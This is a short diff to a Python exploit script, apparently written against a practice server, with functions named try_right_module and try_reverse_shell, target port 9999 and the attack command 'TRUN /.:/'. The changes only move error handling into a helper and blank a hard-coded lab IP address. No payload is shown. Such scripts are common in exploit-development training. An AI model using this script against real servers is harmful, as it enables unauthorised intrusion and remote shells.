@@ -120,8 +120,7 @@ def try_right_module(target_ip, target_port, cmd_attacking):
         s.close()
         border()
     except:
-        print("Error connecting to server")
-        sys.exit()
+        server_error()
 
 
 def try_reverse_shell(target_ip, target_port, cmd_attacking):
@@ -170,7 +169,7 @@ def try_reverse_shell(target_ip, target_port, cmd_attacking):
 
 
 def main():
-    target_ip = "192.168.57.13"
+    target_ip = ""
     target_port = 9999
     cmd_attacking = 'TRUN /.:/'
     # target_ip = str(input('Enter victim ip: '))
